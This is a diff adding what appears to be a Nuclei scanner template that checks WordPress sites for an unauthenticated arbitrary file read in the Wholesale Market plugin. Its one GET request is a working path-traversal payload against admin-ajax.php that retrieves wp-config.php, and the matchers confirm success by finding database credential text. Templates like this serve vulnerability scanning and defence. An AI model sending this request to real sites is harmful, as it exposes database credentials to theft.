@@ -1,0 +1,30 @@
+id: wordpress-wholesale-market-admin-ajax-anyfile-read
+info:
+  name: WordPress Wholesale Market Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,wordpress
+  description: |
+    The WordPress Wholesale Market plugin contains a vulnerability in its admin-ajax.php endpoint, allowing unauthenticated attackers to read arbitrary files on the server.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename=\"wp-config.php\""
+      - type: word
+        part: body
+        words:
+          - "MySQL database username"
+      - type: word
+        part: header
+        words:
+          - "application/log"
